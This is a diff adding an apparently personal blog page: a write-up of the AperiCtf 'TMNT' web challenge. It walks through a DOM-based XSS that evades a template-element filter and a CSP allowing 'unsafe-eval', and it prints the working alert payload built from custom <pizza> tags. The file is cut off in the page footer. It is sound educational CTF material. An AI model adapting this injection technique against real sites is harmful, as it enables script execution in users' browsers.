@@ -1,0 +1,1369 @@
+<!DOCTYPE html>
+<html lang="en-en">
+  <head>
+    
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.52 with theme Tranquilpeak 0.4.3-SNAPSHOT">
+<meta name="author" content="Hugo VINCENT">
+<meta name="keywords" content="web, xss, blog, hacking, Privacy, vie-privée, insa, cybersecurity, infosec, hack">
+<meta name="description" content="Event Challenge Category Points Solves     AperiCtf TMNT web 300 6       TL;DR In this challenge we need to trigger an XSS, first we need to bypass the template engine of the browser to insert custom tags in the page. We can then trigger the XSS with some specific tag and use a DOM-based JavaScript injection vulnerability.
+Step 1 This is my first web write-up, I usually prefer popping shell, but this time we will pop some alert boxes !">
+
+
+<meta property="og:description" content="Event Challenge Category Points Solves     AperiCtf TMNT web 300 6       TL;DR In this challenge we need to trigger an XSS, first we need to bypass the template engine of the browser to insert custom tags in the page. We can then trigger the XSS with some specific tag and use a DOM-based JavaScript injection vulnerability.
+Step 1 This is my first web write-up, I usually prefer popping shell, but this time we will pop some alert boxes !">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TMNT">
+<meta name="twitter:title" content="TMNT">
+<meta property="og:url" content="https://hug0vincent.github.io/2019/10/tmnt/">
+<meta property="twitter:url" content="https://hug0vincent.github.io/2019/10/tmnt/">
+<meta property="og:site_name" content="Hugo">
+<meta property="og:description" content="Event Challenge Category Points Solves     AperiCtf TMNT web 300 6       TL;DR In this challenge we need to trigger an XSS, first we need to bypass the template engine of the browser to insert custom tags in the page. We can then trigger the XSS with some specific tag and use a DOM-based JavaScript injection vulnerability.
+Step 1 This is my first web write-up, I usually prefer popping shell, but this time we will pop some alert boxes !">
+<meta name="twitter:description" content="Event Challenge Category Points Solves     AperiCtf TMNT web 300 6       TL;DR In this challenge we need to trigger an XSS, first we need to bypass the template engine of the browser to insert custom tags in the page. We can then trigger the XSS with some specific tag and use a DOM-based JavaScript injection vulnerability.
+Step 1 This is my first web write-up, I usually prefer popping shell, but this time we will pop some alert boxes !">
+<meta property="og:locale" content="en-us">
+
+  
+    <meta property="article:published_time" content="2019-10-09T16:39:53">
+  
+  
+    <meta property="article:modified_time" content="2019-10-09T16:39:53">
+  
+  
+  
+    
+      <meta property="article:section" content="write-ups">
+    
+      <meta property="article:section" content="AperiCtf">
+    
+  
+  
+    
+      <meta property="article:tag" content="web">
+    
+      <meta property="article:tag" content="xss">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://hug0vincent.github.io/images/TMNT/bg.jpg">
+  <meta property="twitter:image" content="https://hug0vincent.github.io/images/TMNT/bg.jpg">
+
+
+
+
+  <meta property="og:image" content="https://hug0vincent.github.io/images/profil.jpg">
+  <meta property="twitter:image" content="https://hug0vincent.github.io/images/profil.jpg">
+
+
+    <title>TMNT</title>
+
+    <link rel="icon" href="https://hug0vincent.github.io/favicon.png">
+    
+
+    
+
+    <link rel="canonical" href="https://hug0vincent.github.io/2019/10/tmnt/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+
+    
+    <link href="https://fonts.googleapis.com/css?family=Montserrat:300,300i,400,700,700i&amp;subset=cyrillic,cyrillic-ext,latin-ext" rel="stylesheet"> 
+
+    
+    <link rel="stylesheet" href="https://hug0vincent.github.io/css/style-2wfjlq5nwe9qjygqo9yarila7qvjwdmv.min.css" />
+    
+    
+      
+        <link rel="stylesheet"  href="https://hug0vincent.github.io/css/custom.css">
+      
+    
+
+    
+      
+    
+    
+
+    <script type="text/javascript">
+      window.heap=window.heap||[],heap.load=function(e,t){window.heap.appid=e,window.heap.config=t=t||{};var r=t.forceSSL||"https:"===document.location.protocol,a=document.createElement("script");a.type="text/javascript",a.async=!0,a.src=(r?"https:":"http:")+"//cdn.heapanalytics.com/js/heap-"+e+".js";var n=document.getElementsByTagName("script")[0];n.parentNode.insertBefore(a,n);for(var o=function(e){return function(){heap.push([e].concat(Array.prototype.slice.call(arguments,0)))}},p=["addEventProperties","addUserProperties","clearEventProperties","identify","resetIdentity","removeEventProperty","setEventProperties","track","unsetEventProperty"],c=0;c<p.length;c++)heap[p[c]]=o(p[c])};
+        heap.load("381812841");
+  </script>
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="4">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://hug0vincent.github.io/">Hugo</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://hug0vincent.github.io/page/about/">
+    
+    
+    
+      
+        <img class="header-picture" src="https://hug0vincent.github.io/images/profil.jpg" alt="Author&#39;s picture" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://hug0vincent.github.io/page/about/">
+          <img class="sidebar-profile-picture" src="https://hug0vincent.github.io/images/profil.jpg" alt="Author&#39;s picture" />
+        </a>
+        <h4 class="sidebar-profile-name">Hugo VINCENT</h4>
+        
+          <h5 class="sidebar-profile-bio">Student in computer security</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://hug0vincent.github.io/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">Home</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://hug0vincent.github.io/categories/posts">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-pencil"></i>
+      
+      <span class="sidebar-button-desc">Posts</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://hug0vincent.github.io/categories/write-ups">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">Write-Ups</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://hug0vincent.github.io/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">Tags</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://hug0vincent.github.io/page/about/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">About</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/Hug0Vincent" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.root-me.org/hugow?lang=fr#70a472fd3f9279cb9095ce7cbd2cad00" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon rootme_logo "></i>
+      
+      <span class="sidebar-button-desc">Root-me</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://twitter.com/hugow_vincent" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-twitter"></i>
+      
+      <span class="sidebar-button-desc">Twitter</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.instagram.com/hugo_vincent__/" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-instagram "></i>
+      
+      <span class="sidebar-button-desc">Instagram</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+  </div>
+</nav>
+
+      
+  <div class="post-header-cover
+              text-center
+              post-header-cover--full"
+       style="background-image:url('/images/TMNT/bg.jpg')"
+       data-behavior="4">
+    
+      <div class="post-header main-content-wrap text-center">
+  
+    <h1 class="post-title" itemprop="headline">
+      TMNT
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2019-10-09T16:39:53&#43;02:00">
+        
+  October 9, 2019
+
+      </time>
+    
+    
+  
+  
+    <span>in</span>
+    
+      <a class="category-link" href="https://hug0vincent.github.io/categories/write-ups">write-ups</a>, 
+    
+      <a class="category-link" href="https://hug0vincent.github.io/categories/aperictf">AperiCtf</a>
+    
+  
+
+  </div>
+
+</div>
+    
+  </div>
+
+
+      <div id="main" data-behavior="4"
+        class="hasCover
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              
+
+<table>
+<thead>
+<tr>
+<th align="center">Event</th>
+<th align="center">Challenge</th>
+<th align="center">Category</th>
+<th align="center">Points</th>
+<th align="center">Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td align="center">AperiCtf</td>
+<td align="center">TMNT</td>
+<td align="center">web</td>
+<td align="center">300</td>
+<td align="center">6</td>
+</tr>
+</tbody>
+</table>
+
+
+ 
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+  
+    
+      
+    
+  
+
+ 
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+  
+    
+      
+    
+  
+
+<div class="figure  center fig-100" >
+  
+    <a class="fancybox" href="https://hug0vincent.github.io/images/TMNT/desc.png" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/TMNT/desc.png" style="width: 50%;height: 50%;">
+  
+    </a>
+  
+  
+</div>
+
+  <div style="clear:both;"></div>
+
+
+<h1 id="tl-dr">TL;DR</h1>
+
+<p>In this challenge we need to trigger an XSS, first we need to bypass the template engine of the browser to insert custom tags in the page. We can then trigger the XSS with some specific tag and use a DOM-based JavaScript injection vulnerability.</p>
+
+<h1 id="step-1">Step 1</h1>
+
+<p>This is my first web write-up, I usually prefer popping shell, but this time we will pop some alert boxes ! We are faced with a search bar which display information about some ninja turtles.</p>
+
+
+ 
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+  
+    
+      
+    
+  
+
+
+<div class="figure  center fig-100" >
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/TMNT/intro.png" >
+  
+  
+</div>
+
+  <div style="clear:both;"></div>
+
+
+<p>In the source code of the page we can see the script <span class="highlight-text orange">main.js</span>.</p>
+
+
+  
+  
+  
+  
+
+
+<figure class="highlight javascript language-javascript">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-javascript"><code class="javascript">//s parameter is the input of the search box
+s = new URL(window.location.href).searchParams.get(&#39;s&#39;);
+
+if (s !== null) {
+    desc = &#39;&#39;;
+
+    for(var i=0; i&lt;tmnt.length; i&#43;&#43;) {
+        if(s.includes(tmnt[i][&#39;name&#39;])) {
+            desc = tmnt[i].desc;
+            name = tmnt[i].name;
+            break;
+        }
+    }
+    if (desc !== &#39;&#39;) {
+        tmp = document.createElement(&#39;template&#39;); // Used to filter HTML / JS
+        tmp.innerHTML = s.replace(/--&gt;/g, &#39;&#39;); // Double security, we never know
+        document.getElementById(&#39;data&#39;).innerHTML = &#39;&lt;!-- Search : &#39; &#43; tmp.innerHTML &#43; &#39; --&gt;&#39; &#43; name &#43; &#39; : &#39; &#43; desc;
+    } else {
+        //Else fail display no result
+        [...]
+    }
+} else {
+    //Else fail display no result
+    [...]
+}</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<p><code>tmnt</code> is an array containing the name and descriptions of the turtles. So first a template is created, then it search for <code>--&gt;</code> in the input of the user to delete it and finally create some html to add to the page. Indeed, it&rsquo;s reflected on the page:</p>
+
+
+ 
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+  
+    
+      
+    
+  
+
+
+<div class="figure  center fig-100" >
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/TMNT/reflected.png" >
+  
+  
+</div>
+
+  <div style="clear:both;"></div>
+
+
+<p>My naïve approach was to add <code>--!&gt;</code> to the beginning of the input since it&rsquo;s a valid closing comment tag and add <code>&lt;--</code> to the end of my input to close the last part of the comment:</p>
+
+
+  
+  
+  
+  
+
+
+<figure class="highlight html language-html">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-html"><code class="html">--!&gt; Michelangelo &lt;!--</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+
+ 
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+  
+    
+      
+    
+  
+
+
+<div class="figure  center fig-100" >
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/TMNT/inject.png" >
+  
+  
+</div>
+
+  <div style="clear:both;"></div>
+
+
+<p>Some weird things start to happen ! First my closing chevron <code>&gt;</code> has been encoded in <code>&amp;gt;</code> but the other chevrons hasn&rsquo;t. Because of that, my opening comment <code>&lt;!--</code> is useless. And a new closing comment appears out of nowhere.</p>
+
+<p>In the script a comment is left from the author of the challenge:</p>
+
+
+  
+  
+  
+  
+
+
+<figure class="highlight javascript language-javascript">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-javascript"><code class="javascript">tmp = document.createElement(&#39;template&#39;); // Used to filter HTML / JS</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<p>Here is the description of the template tag from mozilla:</p>
+
+<blockquote class="pullquote ">
+	<p>
+[...]
+Think of a template as a content fragment that is being stored for subsequent use in the document. While the parser does process the contents of the template element while loading the page, it does so only to ensure that those contents are valid; the element's contents are not rendered, however.
+</p>
+</blockquote>
+
+<p>So the template element checks that those contents are valid html. This is the first step, we need to make the template engine fail this verification. After a lot of trying and error I came up with this payload:</p>
+
+
+  
+  
+  
+  
+
+
+<figure class="highlight html language-html">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-html"><code class="html">&lt;a--!&gt; Michelangelo &lt;!--</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<p>It seems really simple but took me some time to figure it out. Here is the result:</p>
+
+
+ 
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+  
+    
+      
+    
+  
+
+
+<div class="figure  center fig-100" >
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/TMNT/inject2.png" >
+  
+  
+</div>
+
+  <div style="clear:both;"></div>
+
+
+<p>Due to the Content Security Policy (<a href="https://content-security-policy.com/">CSP</a>) we can&rsquo;t directly inject <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> because it will block inline javascript, this also means that we can&rsquo;t use events like onload, onerror, onclick&hellip; CSP can be found in the source of the page:</p>
+
+
+  
+  
+  
+  
+
+
+<figure class="highlight html language-html">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-html"><code class="html">&lt;meta http-equiv=&#34;Content-Security-Policy&#34; content=&#34;default-src &#39;self&#39;; object-src &#39;none&#39;; script-src &#39;self&#39; &#39;unsafe-eval&#39;;&#34;&gt;</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<p>This <a href="https://csp-evaluator.withgoogle.com/">website</a> allow you to test your CSP:</p>
+
+
+ 
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+  
+    
+      
+    
+  
+
+
+<div class="figure  center fig-100" >
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/TMNT/csp.png" >
+  
+  
+</div>
+
+  <div style="clear:both;"></div>
+
+
+<p>The yellow warning tells us that <span class="highlight-text orange">unsafe-eval</span> could allow execution of code injected into the DOM API, seems promising.</p>
+
+<h1 id="step-2">Step 2</h1>
+
+<p>A second javascript file is loaded in the page, <span class="highlight-text orange">pizza.js</span>.</p>
+
+
+  
+    
+  
+  
+    
+  
+  
+  
+
+
+<figure class="highlight javascript language-javascript">
+  <figcaption>
+    
+      <span>pizza.js</span>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-javascript"><code class="javascript">var user = {&#39;name&#39;: &#39;Michelangelo&#39;, &#39;pizza_stock&#39;: 0, &#39;eated_pizza&#39; : 0};
+
+function wait(ms){
+   var start = new Date().getTime();
+   var end = start;
+   while(end &lt; start &#43; ms) {
+     end = new Date().getTime();
+  }
+}
+
+window.onload = function(e){ 
+
+	p = document.querySelectorAll(&#34;pizza&#34;);
+
+	for(var i = 0; i &lt; p.length; i&#43;&#43;) {
+		if (p[i].getAttribute(&#39;cook&#39;) !== null) {
+			if (p[i].getAttribute(&#39;nb&#39;) !== null) {
+				user.pizza_stock &#43;= parseInt(p[i].getAttribute(&#39;nb&#39;), 10);	
+			} else {
+				user.pizza_stock &#43;= 1;
+			}
+		} else if (p[i].getAttribute(&#39;user&#39;) !== null) {
+			user.name = p[i].getAttribute(&#39;user&#39;);
+		} else if (p[i].getAttribute(&#39;eat&#39;) !== null &amp;&amp; p[i].getAttribute(&#39;nb&#39;) !== null) {
+			if (parseInt(p[i].getAttribute(&#39;nb&#39;), 10) &lt;= user.pizza_stock) {
+				user.eated_pizza &#43;= parseInt(p[i].getAttribute(&#39;nb&#39;), 10);
+				user.pizza_stock -= parseInt(p[i].getAttribute(&#39;nb&#39;), 10);
+			} else {
+				console.log(&#34;Not enough pizza :&#39;(&#34;);
+			}
+			if (user.eated_pizza === 1337) {
+				console.log(user.name &#43; &#34; can&#39;t eat as much as he wants, he needs to take a break...&#34;);
+				setTimeout(&#39;user.eated_pizza = 0; console.log(&#34;&#39; &#43; user.name &#43; &#39; digested everything!&#34;)&#39;, 3000);
+			}
+		}
+	}
+}</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<p>At the end of the file there is an interesting line:</p>
+
+
+  
+  
+  
+  
+
+
+<figure class="highlight javascript language-javascript">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-javascript"><code class="javascript">setTimeout(&#39;user.eated_pizza = 0; console.log(&#34;&#39; &#43; user.name &#43; &#39; digested everything!&#34;)&#39;, 3000);</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<p>If we control the parameter <code>user.name</code> we could potentially execute some javascript code, for example:</p>
+
+
+  
+  
+  
+  
+
+
+<figure class="highlight javascript language-javascript">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-javascript"><code class="javascript">&#34;);alert(&#34;XSS&#34;);console.log(&#34;</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<p>But to get there we need to set up some pizzas tags with custom parameters to pass into the last <code>if</code>:</p>
+
+
+  
+  
+  
+  
+
+
+<figure class="highlight html language-html">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-html"><code class="html">&lt;pizza cook=1337 nb=1337&gt;&lt;/pizza&gt;
+&lt;pizza user=&#39;&#34;);alert(&#34;xss&#34;);console.log(&#34;&#39;&gt;&lt;/pizza&gt;
+&lt;pizza eat=1337 nb=1337&gt;&lt;/pizza&gt;</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<p>So the final payload is:</p>
+
+
+  
+  
+  
+  
+
+
+<figure class="highlight html language-html">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-html"><code class="html">&lt;a---!&gt;Michelangelo &lt;pizza nb=1337 cook=1337&gt;&lt;/pizza&gt;&lt;pizza user=&#39;&#34;);alert(&#34;xss&#34;);console.log(&#34;&#39;&gt;&lt;/pizza&gt;&lt;pizza eat=1337 nb=1337&gt;&lt;/pizza&gt;&lt;!--</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<p>And boom the XSS:</p>
+
+
+ 
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+  
+    
+      
+    
+  
+
+
+<div class="figure  center fig-100" >
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/TMNT/final.gif" >
+  
+  
+</div>
+
+  <div style="clear:both;"></div>
+
+
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">TAGGED IN</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://hug0vincent.github.io/tags/web/">web</a>
+
+  <a class="tag tag--primary tag--small" href="https://hug0vincent.github.io/tags/xss/">xss</a>
+
+                  </div>
+                
+              
+            
+            <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://hug0vincent.github.io/2019/10/pwn-run-see-part-1-2/" data-tooltip="Pwn Run See (part 1 &amp; 2)">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://hug0vincent.github.io/2019/10/tmnt/">
+              <i class="fa fa-facebook-official"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://hug0vincent.github.io/2019/10/tmnt/">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+            
+              
+                <div id="disqus_thread">
+  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2019 Hugo VINCENT. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://hug0vincent.github.io/2019/10/pwn-run-see-part-1-2/" data-tooltip="Pwn Run See (part 1 &amp; 2)">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://hug0vincent.github.io/2019/10/tmnt/">
+              <i class="fa fa-facebook-official"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://hug0vincent.github.io/2019/10/tmnt/">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fhug0vincent.github.io%2F2019%2F10%2Ftmnt%2F">
+          <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fhug0vincent.github.io%2F2019%2F10%2Ftmnt%2F">
+          <i class="fa fa-twitter"></i><span>Share on Twitter</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://hug0vincent.github.io/images/profil.jpg" alt="Author&#39;s picture" />
+    
+    <h4 id="about-card-name">Hugo VINCENT</h4>
+    
+      <div id="about-card-bio">Student in computer security</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Student at INSA / SIF master
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        France
+      </div>
+    
+  </div>
+</div>
+
+    <div id="algolia-search-modal" class="modal-container">
+  <div class="modal">
+    <div class="modal-header">
+      <span class="close-button"><i class="fa fa-close"></i></span>
+      <a href="https://algolia.com" target="_blank" rel="noopener" class="searchby-algolia text-color-light link-unstyled">
+        <span class="searchby-algolia-text text-color-light text-small">by</span>
